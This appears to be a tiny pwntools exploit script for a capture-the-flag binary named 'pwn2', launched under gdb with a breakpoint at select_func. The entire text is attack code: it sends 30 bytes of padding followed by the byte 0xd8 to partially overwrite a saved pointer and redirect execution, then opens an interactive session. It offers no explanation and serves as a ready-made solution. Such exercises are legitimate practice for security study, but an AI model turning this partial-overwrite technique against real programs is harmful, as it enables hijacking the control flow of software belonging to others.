from pwn import * 

target = gdb.debug("./pwn2", "b * select_func")

payload = b"A"* 30
payload += b'\xd8'

target.sendline(payload)

target.interactive()